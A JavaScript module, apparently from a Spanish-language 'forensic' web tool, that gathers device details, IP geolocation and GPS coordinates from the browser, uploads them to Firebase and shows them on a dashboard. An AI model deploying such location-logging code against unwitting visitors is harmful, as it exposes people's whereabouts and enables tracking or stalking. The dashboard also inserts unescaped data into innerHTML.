import { collectData } from './collector.js';
import { getIPGeo, getGPS } from './geolocation.js';
import { sendDataToFirebase, saveFallback } from './firebase.js';

function showMsg(msg, err) {
    const t = document.getElementById('toast');
    if (!t) return;
    t.textContent = msg;
    t.className = 'show' + (err ? ' error' : '');
    clearTimeout(t._timer);
    t._timer = setTimeout(function() { t.className = ''; }, 5000);
}

function updateDash(data) {
    const c = document.getElementById('_dc');
    if (!c || !data) return;
    const geo = data.geo || {};
    const loc = geo.city || geo.country || '';
    const gps = geo.gps || {};
    let html = '<div class="dash-entry">';
    html += '<div class="ip">🌐 ' + (data.ip || 'N/A') + '</div>';
    html += '<div class="time">🕐 ' + (data.timestamp ? new Date(data.timestamp).toLocaleString() : 'N/A') + '</div>';
    html += '<div class="device">📱 ' + (data.platform || 'N/A') + '</div>';
    if (loc) html += '<div class="device">📍 ' + loc + '</div>';
    if (gps.lat && gps.lng) {
        html += '<div class="device" style="color:#00ff88;">🎯 GPS: ' + gps.lat.toFixed(4) + ', ' + gps.lng.toFixed(4) + '</div>';
    }
    html += '</div>';
    c.innerHTML = html;
}

export async function collectAndSend() {
    console.log('Iniciando recoleccion...');
    showMsg('Recolectando datos...');
    const deviceData = collectData();
    if (!deviceData) {
        showMsg('Error al recolectar datos', true);
        return;
    }
    const ipGeo = await getIPGeo();
    if (ipGeo) {
        deviceData.ip = ipGeo.ip;
        deviceData.geo = {
            city: ipGeo.city || 'Desconocida',
            region: ipGeo.region || 'Desconocida',
            country: ipGeo.country || 'Desconocido',
            lat: ipGeo.lat || null,
            lng: ipGeo.lng || null,
            isp: ipGeo.isp || 'Desconocido'
        };
    } else {
        deviceData.ip = 'No disponible';
        deviceData.geo = { city: 'No disponible', country: 'No disponible' };
    }
    const gps = await getGPS();
    if (gps && gps.lat) {
        if (!deviceData.geo) deviceData.geo = {};
        deviceData.geo.gps = { lat: gps.lat, lng: gps.lng, acc: gps.acc || 0 };
    }
    try {
        await sendDataToFirebase(deviceData);
        console.log('Datos guardados:', deviceData.sessionId);
        showMsg('✅ Datos registrados correctamente');
        localStorage.setItem('_lc_' + deviceData.sessionId, JSON.stringify(deviceData));
        const dash = document.getElementById('_dash');
        if (dash && dash.classList.contains('active')) {
            updateDash(deviceData);
        }
    } catch (err) {
        console.error('Error Firebase:', err);
        showMsg('❌ Error al guardar: ' + err.message, true);
        saveFallback(deviceData);
        localStorage.setItem('_fb_' + deviceData.sessionId, JSON.stringify(deviceData));
    }
}

window.__forensic = {
    collectAndSend: collectAndSend,
    getIPGeo: getIPGeo,
    getGPS: getGPS,
    collectData: collectData,
    updateDash: updateDash,
    showMsg: showMsg
};

export { updateDash, showMsg };
